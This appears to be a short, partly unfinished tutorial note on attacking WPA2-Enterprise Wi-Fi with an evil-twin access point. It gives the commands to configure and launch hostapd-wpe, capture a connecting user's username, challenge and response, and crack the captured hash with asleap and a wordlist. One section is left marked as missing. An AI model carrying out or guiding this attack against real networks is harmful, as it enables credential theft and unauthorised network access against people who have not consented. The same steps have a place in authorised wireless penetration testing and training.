There are two ways to hack WPA2/Enterprise:
* Evil Twin Attack with Fake Open Authentication Login
* Evil Twin Attack with WPA/WPA2 Enterprise network


### Fake Open Authentication Login (MISSING, probably with hostapd)

### Fake WPA/WPA2 Enterprise network

We can use hostapd-wpe, we want to change the configuration of hostapd, by
doing:
```sh
vim /etc/hostapd-wpe/hostapd-wpe.conf
```
Here we want to modify:
* Interface name
* SSID

Now we can do:
```sh
service network-manager stop # to stop NetworkManager
```

and then launch hostapd-wpe by doing:
```sh
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

Now once the user connects, we are able to capture its username, its challenge
and its response.

Now we are going to use a dictionary attack, we can use asleap to do this, by
doing:

```sh
asleap -C <challenge> -R <response> -W </path/to/pwordlist.txt>
```
